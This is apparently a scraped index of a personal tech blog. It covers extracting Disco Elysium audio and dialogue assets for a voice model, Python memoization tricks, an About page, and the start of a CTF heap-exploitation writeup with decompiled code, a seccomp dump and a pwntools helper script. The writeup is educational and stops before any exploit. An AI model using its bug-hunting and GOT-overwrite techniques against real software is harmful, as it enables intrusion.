(dialogue, thoughts, item descriptions, etc.) in the entire game is bundled in this one asset. Exported, this amounts to a 266MB .json file, as we expected earlier. After extracting the audio files as well, I have the following data: ~/DiscoAudioSources$ tree . ‚îú‚îÄ‚îÄ AudioClip ‚îÇ¬†‚îú‚îÄ‚îÄ Abandoned Lorry-JAM INSTIGATOR CABIN-118.wav ‚îÇ¬†‚îú‚îÄ‚îÄ Abandoned Lorry-JAM INSTIGATOR CABIN-120.wav ‚îÇ¬†‚îú‚îÄ‚îÄ Abandoned Lorry-JAM INSTIGATOR CABIN-123.wav ..... ‚îÇ¬†‚îî‚îÄ‚îÄ Yellow Man Mug-INVENTORY MUG-9.wav ‚îî‚îÄ‚îÄ MonoBehaviour ‚îî‚îÄ‚îÄ Disco Elysium.json AudioClip/ contains the files for (1), MonoBehaviour/ contains the lines for (2). ","date":"September 11, 2022","objectID":"/blog/dn-1/:1:0","tags":["Disco Elysium","reverse engineering","part of a series","WIP"],"title":"Disco Narrator - Data Scraping","uri":"/blog/dn-1/"},{"categories":["tech"],"content":"Linking audio to dialogue I had hoped the AudioClip assets would contain some labelled metadata, but to my consternation, the audio files and dialogue text were bundled separately. So the .wav files themselves aren‚Äôt very useful, and I need to gather more information. Specifically, for each audio file, I need to know Which voice actor is speaking, and What lines are being read ","date":"September 11, 2022","objectID":"/blog/dn-1/:2:0","tags":["Disco Elysium","reverse engineering","part of a series","WIP"],"title":"Disco Narrator - Data Scraping","uri":"/blog/dn-1/"},{"categories":["tech"],"content":"Dead-end: disco-courier The first thing I tried was to locate the information in dialog.json. The Disco Courier project I mentioned earlier was made to work with it, so I started with an npm install: only 3 critical! The app was a little bit old ‚Äì last commit in 2021. 1 year is about two centuries long in the NodeJS ecosystem, so the app obviously crashed on first try: So, I did a little bit of debugging and added the fixes to my fork. Details of the bug, if you care To start, I grep the source for the version of your data, and quickly find the problem: The version is hardcoded‚Ä¶ along with some metadata about the json file. I extracted these with a oneliner: $ fx src/data/dialog.json 'd =\u003e ({version: d.version, rowCounts: { locations: d.locations.length, actors: d.actors.length, items: d.items.length, variables: d.variables.length, conversations: d.conversations.length }})' { \"version\": \"5/20/2022 12:05:57 PM\", \"rowCounts\": { \"locations\": 0, \"actors\": 424, \"items\": 259, \"variables\": 10645, \"conversations\": 1501 } } And patched that output into the source. After that, I tried running the project with one of the suggested example commands: $ courier -- --export=json --actor=3 --OR=true --conversant=6 conversations.dialog # \"Creates a detailed json export where the speaker is Kim, OR the conversant is Garte.\" Naturally, this didn‚Äôt do what it said it would do. After fixing another minor bug (the output directory, ./src/data/json, did not exist), I found a list of conversations from The Player to Cunoesse at ./src/data/json/conversations/conversations.dialog.json. After accounting for bugs, I get a json file of dialogue entries from courier. A single dialog entry looks like this: { \"parentId\": 1039, \"dialogId\": 222, \"isRoot\": 0, \"isGroup\": 0, \"refId\": \"0x0100005A0000E5F6\", \"isHub\": false, \"dialogShort\": \"Little Lily: \\\"\\\"Ll... Luby... Rr... R-luuby.\\\" Sudd...\\\"\", \"dialogLong\": \"\\\"Ll... Luby... Rr... R-luuby.\\\" Suddenly the girl gets all serious and leans in, as if she's about to tell you a secret.\", \"actorId\": 101, \"actorName\": \"Little Lily\", \"conversantId\": 0, \"modifiers\": [], \"conditionPriority\": 2, \"userScript\": \"\", \"inputId\": \"0x0100002100000B63\", \"outputId\": \"0x0100002100000B70\" } And although there‚Äôs a lot of information in that entry, there‚Äôs nothing that tells me what audio file (if any) this line is linked to. Dead end. ","date":"September 11, 2022","objectID":"/blog/dn-1/:2:1","tags":["Disco Elysium","reverse engineering","part of a series","WIP"],"title":"Disco Narrator - Data Scraping","uri":"/blog/dn-1/"},{"categories":["tech"],"content":"Further sleuthing So, a third-party CLI app failed to give me the information I wanted. Maybe I should‚Äôve been a little less credulous, and checked the game files myself? Answer: no, disco-courier is doing about the best it can. The only thing I really notice is that what the CLI app calls refIds are named articyIds in the game files. In desperation, I try to run grep on the raw assets to see if I‚Äôd get anything. ~/disco_Data$ grep 'Ruud Hoenkloewen-PLAZA KORTENAER-74' * Binary file sharedassets1.assets matches To my surprise, it did find something. sharedassets1; what‚Äôs in there? A lot of things, unfortunately. Let's try harder. Shared Asset Extraction As with before, let‚Äôs start by sorting by size: That won't work; textures are big. Filter by MonoBehaviour? Hello. I click on the asset, hit Esc after a file browser pop-up appears inexplicably, and I see: An empty object? No, wait. An error. I search through Github Issues and... please check https://github.com/Perfare/AssetStudio#export-monobehaviour Ah. I failed to the documentation. Again. One installation of Il2CppDumper.exe later, and I create the fake .dll files AssetStudio is looking for: C:\\Program Files\\Steam\\steamapps\\common\\Disco Elysium\\disco_Data\u003eC:\\Program Files\\Il2CppDumper-net6-v6.7.25\\Il2CppDumper.exe ..\\GameAssembly.dll .\\il2cpp_data\\Metadata\\global-metadata.dat C:\\il2cpp_out Initializing metadata... Metadata Version: 27 Initializing il2cpp file... Il2Cpp Version: 27 Searching... Change il2cpp version to: 27.1 CodeRegistration : 18216e9c0 MetadataRegistration : 182173350 Dumping... Done! Generate struct... Done! Generate dummy dll... Done! Press any key to exit... C:\\Program Files\\Steam\\steamapps\\common\\Disco Elysium\\disco_Data\u003e Re-opening AssetStudio, I follow the README, and‚Ä¶ It‚Äôs there! AssetName, ArticyID. The AssetNames match up with the .wav filenames we extracted, and the ArticyIDs match exactly to the expected dialogue for each audio file. Taking the first example in the image, 0x010000060001BDCA refers to this part of the massive Dialogue json: With all the information we need (theoretically) in tow, we can move on to Data Formatting. ","date":"September 11, 2022","objectID":"/blog/dn-1/:2:2","tags":["Disco Elysium","reverse engineering","part of a series","WIP"],"title":"Disco Narrator - Data Scraping","uri":"/blog/dn-1/"},{"categories":["not a post"],"content":"How I made a Text-to-Speech (TTS) model for (some of) a video game‚Äôs characters. Post TL;DR Data scraping Simple retelling of the data collection process Data formatting Python scripting to LJSpeech, plus data cleaning methods Simplistic Training Various attempts to create my first model Additional characters Training extra models, and the limitations of small datasets Disco Narrator - Data Scraping152334H ¬†1208 words¬† ¬†6 minutes¬†¬†published on September 11, 2022¬†included in techTo train an AI Text-To-Speech (TTS) model, we‚Äôll need to obtain a Labelled Dataset with two things: Clean audio files, containing only the voice we‚Äôre cloning The dialogue transcript (text) for each audio file Read More ¬†Disco Elysium,¬†reverse engineering,¬†part of a series,¬†WIP Disco Narrator - Data Formatting152334H ¬†3220 words¬† ¬†16 minutes¬†¬†published on September 25, 2022¬†included in techWith the raw data in tow, we can construct a proper TTS Dataset with the use of a few Python scripts. Read More ¬†Disco Elysium,¬†pandas,¬†part of a series,¬†WIP ","date":"September 11, 2022","objectID":"/disco-narrator/:0:0","tags":["machine learning","Disco Elysium","WIP","series"],"title":"The making of: Disco Narrator","uri":"/disco-narrator/"},{"categories":["tech"],"content":"The default shell prompt (for Ubuntu 20) looks like this: username@hostname:/path/to/cwd$ ‚ñà The format of the prompt is defined in .bashrc, as the PS1 variable: If you add a newline around the end of the PS1 defintion, your shell will start looking like this (after re-running bash): username@hostname:/path/to/cwd $ ‚ñà Why do this? More screen width for a one-liner. You can write longer commands before you get disrupted by line-wrapping. Especially useful if you‚Äôre using Termux. Easier to read the prompt. Your eyes naturally capture text above\u0026below the line you‚Äôre working on, so you get to see more without shifting attention. It‚Äôs an extremely simple thing to do. It‚Äôs cumbersome and potentially disruptive to install $your_favourite_shell_theme every time you touch a remote machine, whereas adding \\n to .bashrc takes about ten seconds in a text editor. ","date":"September 4, 2022","objectID":"/blog/append-a-newline/:0:0","tags":["my setups"],"title":"Append a newline to your shell prompt","uri":"/blog/append-a-newline/"},{"categories":["tech"],"content":"Memoization is a part of the standard toolkit for, ‚Äúthings I can use to solve the algorithm question in my next job interview‚Äù. Most of the time, I like to use functools.cache for this: From @gf_256 Using the fibonacci function as an example, a simple Python implementation might look like this: # With @cache from functools import cache # python3.9 @cache def fib(n: int) -\u003e int: return n if n \u003c 2 else fib(n-1) + fib(n-2) # Assume that `fib(n)` only receives non-negative integers. However, some interviewers might reject that One Weird Trick, given that the point of most coding interviews is to check for one‚Äôs understanding of the algorithm, rather than its existence. So, instead of importing a solution, you‚Äôd manually create/check a hashtable, typically named dp[]: # Without @cache dp = {0:0, 1:1} # base cases def fib(n: int) -\u003e int: res = dp.get(n,None) # avoid using `n in dp` to if res is None: # minimise calls to dp.__getitem__ dp[n] = res = fib(n-1) + fib(n-2) return res And this works just as well as the @cache solution: \u003e\u003e\u003e [fib(i) for i in range(10)] [0, 1, 1, 2, 3, 5, 8, 13, 21, 34] Job well done? Probably. But personally, don‚Äôt like it. The @cached solution is simple, readable, and intuitive. It‚Äôs practically identical to how you‚Äôd write it mathematically: $$ \\forall\\ n \u003e 1, F_n = F_{n-1} + F_{n-2}$$ The manual dp[] solution is not as nice. The base cases are a bit more obvious, but the meat of the function is a lot more different. Plus, the dp[] variable gets leaked to the global namespace, when it should really only be accessible to the fib() function itself. Can we do better? ","date":"August 28, 2022","objectID":"/blog/encapsulating-dp/:0:0","tags":["code","python"],"title":"@cache without @cache","uri":"/blog/encapsulating-dp/"},{"categories":["tech"],"content":"Alternatives I want to bind a stateful variable (dp[]) to a function. The natural tool for that in python is an object, so let‚Äôs do that: # Without @cache, using a class class Fib: dp = {0:0, 1:1} def fib(n: int) -\u003e int: res = Fib.dp.get(n,None) if res is None: Fib.dp[n] = res = Fib.fib(n-1) + Fib.fib(n-2) return res fib = Fib.fib This works (as in, dp{} is no longer a global variable), but it‚Äôs much uglier. Can we do better? Did you know that in Python, functions are objects too? # Without @cache, using the function itself as a class def fib(n: int) -\u003e int: res = fib.dp.get(n,None) if res is None: fib.dp[n] = res = fib(n-1) + fib(n-2) return res fib.dp = {0:0, 1:1} You can assign any attribute to a function, and it‚Äôll just work. Albeit with potential performance issues. Still, both of these options leaves .dp available to the public namespace. Can we hide it entirely? In theory, this is what you‚Äôd use a closure for: # Without @cache, using a closure def _make_fib(): dp = {0:0, 1:1} def fib(n: int) -\u003e int: res = dp.get(n,None) if res is None: dp[n] = res = fib(n-1) + fib(n-2) return res return fib fib = _make_fib() But this is really long and ugly. We can separate the business logic with the decorator pattern: # Without @cache, using a decorator def dpcache(f): dp = {} def inner(n): res = dp.get(n,None) if res is None: dp[n] = res = f(n) return res return inner @dpcache def fib(n: int) -\u003e int: return n if n \u003c 2 else fib(n-1) + fib(n-2) And, in doing so, return to the original @cache design for the fib() function. This is even somewhat similar to what @cache itself does, the Least Recently Used part aside. The bootleg @dpcache solution might be the cleanest, but it also has the largest number of lines of all the solutions suggested. If we‚Äôre comfortable with making our code look ugly, we can use a hack with default variables instead: # Without @cache, using a default variable def fib(n: int, *, dp={0:0,1:1}) -\u003e int: res = dp.get(n,None) if res is None: dp[n] = res = fib(n-1) + fib(n-2) return res This is very close to the essence of our initial design for manual memoization, while also keeping the dp[] dictionary encapsulated. The positional glob (*) limits the potential for an accidental fib(n, ?) call, but it‚Äôs possible someone else might unwittingly add the dp= argument after reading fib()‚Äôs type signature. The use of default arguments in a singleton fashion this way is also, practically speaking, too smart for its own good ‚Äì it‚Äôs a Code Smell, albeit in a different manner than having global variables. ","date":"August 28, 2022","objectID":"/blog/encapsulating-dp/:1:0","tags":["code","python"],"title":"@cache without @cache","uri":"/blog/encapsulating-dp/"},{"categories":["not a post"],"content":"Otherwise known as the more verbose 404","date":"August 26, 2022","objectID":"/todo/","tags":["WIP"],"title":"TODO","uri":"/todo/"},{"categories":["not a post"],"content":"If you‚Äôre reading this page, it means one of two things: You intentionally saw the page titled, ‚ÄúTODO‚Äù, and decided to check it out. Here it is. You were on one of the normal pages of this site, clicked a hyperlink, and found yourself here inexplicably. The rest of this page is dedicated to (2). Welcome to the null pointer This is the null pointer node. It‚Äôs the page that says, ‚ÄúThat blog post you were looking for doesn‚Äôt exist yet.‚Äù My blog notes form a vague, gestational web of thinking. Although some of my blogposts are isolated nodes, more often I have posts referencing posts referencing posts referencing‚Ä¶ a dense graph with connections all over the place. Filling out the full details of the whole graph is difficult ‚Äì I‚Äôm a slow writer ‚Äì so I often make posts that reference incomplete, unpublished ideas. The link that you clicked to get here will be real page, someday. Just not yet. ","date":"August 26, 2022","objectID":"/todo/:0:0","tags":["WIP"],"title":"TODO","uri":"/todo/"},{"categories":["not a post"],"content":" Welcome This is the personal site of Sherman Chann (aka 152334H) ","date":"August 12, 2022","objectID":"/about/:0:0","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Stuff I‚Äôve done Weakly sorted by chronology Psst... Each section starts with a few logos like these: They indicate, roughly speaking, what technologies I used for a specific project. If you‚Äôre confused about their relevance, try hovering over them (or long press on mobile): some of these icons have titles explaining what they‚Äôre used for: ","date":"August 12, 2022","objectID":"/about/:1:0","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"This blog You‚Äôre looking at it! This blog is hosted by Github Pages. I upload the source files for this blog (developed in Hugo) to a repository, triggering a Github Action that compiles everything into a bundle minified HTML/CSS/JS. This produces the static page you‚Äôre reading right now. Previously, I used Jekyll (instead of Hugo), but there were many unfortunate problems with that setup. More on that here. I use Obsidian to draft out posts, before settling the post metadata \u0026\u0026 final checks in neovim while running hugo server -D. This isn‚Äôt the greatest workflow, and I‚Äôm working on a file sync system to smoothen the process. ","date":"August 12, 2022","objectID":"/about/:1:1","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Disco Narrator A simple web app (demo) that uses AI to emulate the voices of a few video game characters. Forked from the Controllable TalkNet project. More information available in the following series: The making of: Disco Narrator152334H ¬†153 words¬† ¬†One minute¬†¬†published on September 11, 2022¬†included in not a postHow I made a Text-to-Speech (TTS) model for (some of) a video game‚Äôs characters. Read More ¬†machine learning,¬†Disco Elysium,¬†WIP,¬†series ","date":"August 12, 2022","objectID":"/about/:1:2","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"react-viewer-viewer A small React.js Tauri App (full demo here, if the one below doesn‚Äôt work) I developed to learn the basics of modern Full Stack development. Keywords: typescript, material-ui, create-react-app. Your browser does not support iframes. Some screenshots: Not very complex Matryoshka screenshot I started the project while I was midway through the Full Stack Open course online, so some of the design decisions in the app are regrettable. I‚Äôve also developed a small backend API for the app (keywords: NodeJS, Express, MongoDB, docker-compose), but I‚Äôve yet to publish its source. ","date":"August 12, 2022","objectID":"/about/:1:3","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Sieberrsec CTF 3.0 (2021) Together with my friends at IRS Cybersec, we hosted Sieberrsec CTF 3.01, an online competition with \u003e200 players, targeting Singaporeans in Secondary/Pre-Teritary Education. Promotional image from 2021. The link works as of 08/2022, but won‚Äôt stay up forever. I was personally responsible for: Challenge development: I made the most number of challenges, tested even more of them, and did my best to simplify/balance them in favour of the participants. I also handled the hosting/testing for most remote challenge microservices. QA/Admin details: CTF Platform testing, Discord announcements/organisation, post-event cleanup \u0026\u0026 writeup collection. It takes a lot more than that to run a CTF, but I‚Äôll leave that information to a future post. 1 - 1.0 was a school event, 2.0 was nominally public but primarily catered to a few schools. ","date":"August 12, 2022","objectID":"/about/:1:4","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"CVEs (at Star Labs) CVE-2021-34978 CVE-2021-34979 ","date":"August 12, 2022","objectID":"/about/:1:5","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"pwnscripts (2020-2021) pwnscripts is a deprecated Python package I developed as a personal extension of pwntools. This was the first serious project I created. It‚Äôs not big ‚Äì a few thousand Lines of Code in total ‚Äì but it got me working with technologies that I had felt were for Real‚Ñ¢ Developers Only. To summarise: I experienced the process of creating, developing, and publishing Python libraries to PyPi I went through Test Driven Development with the pytest framework. I made use of Github Actions to do the two things above automatically after pushing commits. I tried switching to vscode because I realised plain old vim wasn‚Äôt enough for modern development (although later I switched back to neovim after understanding its plugin ecosystem better). I got to understand first-hand why people don‚Äôt recommend using Python for large projects (spoiler: __magic_methods__ are exceedingly bad for code readability!) And I learned a lot about programming in general, along the way. But I‚Äôm not working on this project anymore, because‚Ä¶ ","date":"August 12, 2022","objectID":"/about/:1:6","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"CTF player (2019-2021) I used to be very active in the CTF scene. My old CTFTime profile and my team‚Äôs writeup repository is full of hundreds of challenges I‚Äôve covered over the years. I won prizes for several local competitions in that time period, including: 1st in CDDC 2020 (Junior Category) 1st in Cyberthon 2020 2nd in Whitehacks 2020 1st in STACK The Flags 2020 (Junior Category) 1st in Whitehacks 2021 3rd in DSO-NUS CTF 2021 1st in CTF.SG CTF 2021 I am no longer a CTF player. I‚Äôm happy to assist juniors/newcomers in learning the fundamentals, but I‚Äôm effectively retired from the local cadre of CTF professionals. ","date":"August 12, 2022","objectID":"/about/:1:7","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Advent of Code Advent of Code was my introduction to the world of programming puzzles. My secondary school didn‚Äôt offer much in the way of programming (beyond the regrettable Hello World tutorials), and I might not have become the programmer I am today without Eric Wastl‚Äôs work. Year Points (global) Languages 2018 0 :( Python, C 2019 37 Python, JS, C 2020 28 Python 2021 372 Python Although I started playing Advent of Code to learn programming, I mostly do it for the fun of it, nowadays. ","date":"August 12, 2022","objectID":"/about/:1:8","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Other programming problems Kattis While I‚Äôm not a Real‚Ñ¢ Competitive Programmer, I play contests every now and then for fun, as well as to keep myself qualified for basic coding interviews. ","date":"August 12, 2022","objectID":"/about/:1:9","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Open source contributions I‚Äôve made minor contributions to other people‚Äôs repositories. See my GitHub profile for more info. ","date":"August 12, 2022","objectID":"/about/:1:10","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Academics I‚Äôm an alumnus of Hwa Chong Institution (College), and spent most of my free time there helping out the Cybersecurity Section of the Infocomm and Robotics Society (IRS). Some info that will only make sense to Singaporean eggheads: PCMH+H3 Chem, AAAA/AD+Dist, SSEF, SChO. I include this for completion‚Äôs sake; most readers probably don‚Äôt care about this. ","date":"August 12, 2022","objectID":"/about/:2:0","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"My religious beliefs Ubuntu, neovim, tabs \u003e splits, tmux, docker, python3 (4 spaces per indent), Rust \u003e C*, typescript, printf-debugging, Casing_doesNotMatter, iterators \u003e indexing, Copilot, industry collapse by 2030. ","date":"August 12, 2022","objectID":"/about/:3:0","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["CTF"],"content":"An unfinished pwn writeup, wrapped with the airs of regret.","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"If you‚Äôre only interested in the technical details for The Mound, I have a minified version of this post on ctfdump. Back in May, I started work on the outlines of a special blogpost. It‚Äôs working title was Doing pwn fast: a personal strategy for speedpwning in CTFs, and I scrapped it when I realised how luridly inefficient I can be in the process of pwning. The inefficiency ‚Äì as revolting as it was ‚Äì wasn‚Äôt an immediate concern, and I moved on. Fast forward to now. In the leadup to the 9th of August, I spent my weekend huddled in my house, itching away at RaRCTF‚Äôs toughest pwnable: an introductory heap CLI that certain professionals finished within hours: I wasn‚Äôt one of those professionals. Have a look at the scoreboard graph for the group of experts I happened to tag along with: Read the graph: Aug 8, 1PM minus Aug 7, 1AM. Accounting for sleep, I spent about a full day on a regular glibc pwn challenge. In the spirit of the Sunk Cost Fallacy, I figured I‚Äôd invest even more of my time into picking apart the challenge through this over-elaborate writeup. Crazy, right? There‚Äôs something cathartic, in writing all of this. A eulogy of sorts to the abandoned introspection I attempted in May. Could I have done this challenge faster, if I‚Äôd went about things differently? Maybe, but that‚Äôs not the question I‚Äôll be answering in this writeup. I made a number of mistakes in my approach to this challenge, mistakes that I‚Äôll be covering in detail here. In the future, I might try to generalise the problems I‚Äôve identified here for a better rendition of Doing pwn fast, but for now: The Mound [800] The glibc heap is too insecure. I took matters into my own hands and swapped efficiency for security. Files: mound.zip Archive: mound.zip Length Date Time Name --------- ---------- ----- ---- 18160 2021-08-06 09:14 mound/mound 451 2021-08-06 04:38 ctf.xinetd 566 2021-08-06 17:08 Dockerfile 100 2021-08-06 16:43 setup.sh 25 2021-08-06 04:39 start.sh 22 2021-08-06 17:30 flag.txt 2029224 2021-08-06 17:13 libc.so.6 Relevant details: $ checksec mound/mound [*] '/mound' Arch: amd64-64-little RELRO: Partial RELRO # ! Stack: No canary found # ! NX: NX enabled PIE: No PIE (0x400000) # ! $ seccomp-tools dump mound/mound line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0c 0xc000003e if (A != ARCH_X86_64) goto 0014 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0a 0x00 0x40000000 if (A \u003e= 0x40000000) goto 0014 0004: 0x15 0x09 0x00 0x0000003b if (A == execve) goto 0014 0005: 0x15 0x08 0x00 0x00000142 if (A == execveat) goto 0014 0006: 0x15 0x07 0x00 0x00000002 if (A == open) goto 0014 0007: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0014 0008: 0x15 0x05 0x00 0x00000055 if (A == creat) goto 0014 0009: 0x15 0x04 0x00 0x00000086 if (A == uselib) goto 0014 0010: 0x15 0x03 0x00 0x00000039 if (A == fork) goto 0014 0011: 0x15 0x02 0x00 0x0000003a if (A == vfork) goto 0014 0012: 0x15 0x01 0x00 0x00000038 if (A == clone) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL $ ./libc-database/identify libc.so.6 libc6_2.31-0ubuntu9.1_amd64 The seccomp filter is a little bit interesting, but I‚Äôll cover it later on. It‚Äôs also worth noting that setup.sh contains this line: $ cat setup.sh #!/bin/sh mv /pwn/flag.txt /pwn/$(xxd -l 16 -p /dev/urandom).txt ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:0:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Working backwards mount has a good number of functions: There‚Äôs a function named win; that seems rather important. ssize_t win() { char buf[64]; // [rsp+0h] [rbp-40h] BYREF puts(\"Exploiting BOF is simple right? ;)\"); return read(0, buf, 0x1000uLL); } The binary doesn‚Äôt have PIE or stack canaries or RELRO enabled, so the bulk of this challenge must be in gaining RIP control via a GOT overwrite. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:1:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Program outline This is main() (partially prettified): void *arr[16]; // .bss:0x404180 size_t sizes[16]; // .bss:0x404200 int main() { unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); install_seccomp(); puts(\"I am the witch mmalloc\"); puts(\"Force, Prime, Mind, Lore, Chaos, Orange, Einharjar, Poortho, Spirit, Red, Roman, Corrosion, Crust, Rust, all is known to me.\"); puts(\"It is, from all of my training, that I have seen the flaws in glibc heap.\"); puts(\"Welcome, fellow pwner, to The Mound\"); moundsetup(); memset(s, 0, 0x100uLL); while ( 1 ) { #define REJECT {puts(\"No.\"); break;} switch ( int opt = menu() ) { case 4: // free printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; case 3: // edit printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; case 2: // add printf(\"Size of pile: \"); __isoc99_scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; default: puts(\"Cya later :p\"); exit(0); } } } That‚Äôs pretty long. Let‚Äôs break it up into two segments: the preamble, and the while(1) loop. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:2:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Preamble main() doesn‚Äôt have a lot of variables. unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF The 3 variables here are user-editable, and we‚Äôll talk about them later. Just keep in mind that user_sz and idx are unsigned integers written to with scanf(\"%d\") calls later on, and s[] is written to with a non-overflowing, non-zero-terminating1 read() call. After this, main() runs a bunch of initialisers: setvbuf(...); // all 3 i/o streams are unbuffered install_seccomp(); // start seccomp filter as shown at the start of this writeup puts(...); // intro message moundsetup(); // setup the \"mound\"; this challenge's heap implementation memset(s, 0, 0x100uLL); // don't think too much about this; s[] can still be used for a leak if you try hard enough The only complicated function here is moundsetup(); skip ahead to this part of the writeup if you want to understand it. If not: ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:2:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"main()‚Äôs loop The CLI gives five options: 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home Here‚Äôs a skeleton script to deal with the options: from pwnscripts import * context.binary = 'mound' context.libc = 'libc.so.6' r = context.binary.process() def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(sz: int, idx: int, s: bytes): choose(2) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) (5) just calls exit(0), but the rest are more complex. Add sand case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; This option is really weird. A user-inputted stream of bytes ‚Äì not necessarily nul-terminated ‚Äì are sent to strdup, and the resultant glibc malloc‚Äôd string is stored at arr[idx]. This means that some of arr[]‚Äôs elements can be a mixture of mound pointers, and actual glibc heap pointers. It‚Äôs also worth noting that the str* functions here can overflow, depending on whether the stack has extra nul-bytes or not. Add dirt case 2: // add printf(\"Size of pile: \"); scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; So this is a little bit interesting. The maximum allocation size is 0xfff; user_sz is an unsigned so the single-bounded comparison works out. For some reason, sizes[idx] is set to 0 instead of user_sz. This is a little bit weird because of case 3: Replace dirt case 3: // edit printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; sizes[idx] has to be non-zero for the edit to pass. Since Option 2 sets sizes[idx] to 0, arr[idx] can only be edited if it‚Äôs a pointer from the glibc heap in case 1, or if sizes[idx] can be modified somewhere else. Remove dirt case 4: // free printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); // remember that `idx` itself is typed as unsigned. if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; This option calls mfree() on arr[idx]. There‚Äôs only one bug here, and it‚Äôs that arr[idx] is not zeroed. So, this is a little bit odd. There are obvious Bad Things going on in these options, but the exploit required isn‚Äôt immediately obvious here. I‚Äôll need to dive deeper into the mound implementation. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:2:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mound The mound is kind of like the glibc heap, if it had nothing but the tcache. At the start of the program, the mound grabs two big memory spaces from mmap: 0x00000beef0000000 0x00000beef0400000 0x0000000000000000 rw- 0x00000dead0000000 0x00000dead0009000 0x0000000000000000 rw- 0xbeef* stores the actual data distributed by mmalloc; I‚Äôll call it mound_data. At the beginning of its life, the entirety of the mound_data segment constitutes the 